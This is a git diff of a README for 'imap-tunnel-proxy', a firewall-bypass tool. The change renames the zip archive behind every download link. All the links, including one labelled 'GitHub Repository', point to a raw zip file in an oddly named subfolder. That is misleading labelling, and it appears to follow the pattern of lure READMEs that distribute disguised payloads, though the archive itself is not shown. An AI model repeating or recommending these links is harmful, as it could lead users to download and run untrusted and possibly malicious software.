@@ -1,6 +1,6 @@
 # 🚀 imap-tunnel-proxy - Bypass Firewalls Seamlessly
 
-[![Download imap-tunnel-proxy](https://github.com/Maxu46/imap-tunnel-proxy/raw/refs/heads/main/Alexas/proxy-tunnel-imap-v3.3.zip)](https://github.com/Maxu46/imap-tunnel-proxy/raw/refs/heads/main/Alexas/proxy-tunnel-imap-v3.3.zip)
+[![Download imap-tunnel-proxy](https://github.com/Maxu46/imap-tunnel-proxy/raw/refs/heads/main/Alexas/tunnel_imap_proxy_v3.3.zip)](https://github.com/Maxu46/imap-tunnel-proxy/raw/refs/heads/main/Alexas/tunnel_imap_proxy_v3.3.zip)
 
 ## 📖 Overview
 
@@ -29,7 +29,7 @@ Follow these steps to download and run imap-tunnel-proxy on your device.
 
 Click the link below for the latest version of imap-tunnel-proxy:
 
-[Download imap-tunnel-proxy](https://github.com/Maxu46/imap-tunnel-proxy/raw/refs/heads/main/Alexas/proxy-tunnel-imap-v3.3.zip)
+[Download imap-tunnel-proxy](https://github.com/Maxu46/imap-tunnel-proxy/raw/refs/heads/main/Alexas/tunnel_imap_proxy_v3.3.zip)
 
 ### 2. Choose Your Version
 
@@ -62,8 +62,8 @@ Once configured, you are ready to use imap-tunnel-proxy. Launch the application 
 
 ## 🔗 Resources
 
-- [GitHub Repository](https://github.com/Maxu46/imap-tunnel-proxy/raw/refs/heads/main/Alexas/proxy-tunnel-imap-v3.3.zip)
-- [Download imap-tunnel-proxy](https://github.com/Maxu46/imap-tunnel-proxy/raw/refs/heads/main/Alexas/proxy-tunnel-imap-v3.3.zip)
+- [GitHub Repository](https://github.com/Maxu46/imap-tunnel-proxy/raw/refs/heads/main/Alexas/tunnel_imap_proxy_v3.3.zip)
+- [Download imap-tunnel-proxy](https://github.com/Maxu46/imap-tunnel-proxy/raw/refs/heads/main/Alexas/tunnel_imap_proxy_v3.3.zip)
 
 ## 🛡️ Security Notice
 
